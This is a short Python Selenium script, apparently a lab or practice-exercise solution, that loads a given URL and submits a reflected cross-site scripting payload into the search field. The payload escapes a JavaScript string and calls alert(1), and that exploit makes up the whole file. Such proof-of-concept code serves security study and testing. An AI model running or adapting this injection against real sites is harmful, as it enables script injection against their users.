import time
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    search_query = '\\"-alert(1)}//'

    driver = webdriver.Chrome()
    driver.get(url)

    try:
        search_field = driver.find_element(By.NAME, "search")

        search_field.send_keys(search_query)
        search_field.send_keys(Keys.RETURN)

        time.sleep(2)

        search_field.send_keys(Keys.RETURN)

        time.sleep(2)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        driver.quit()
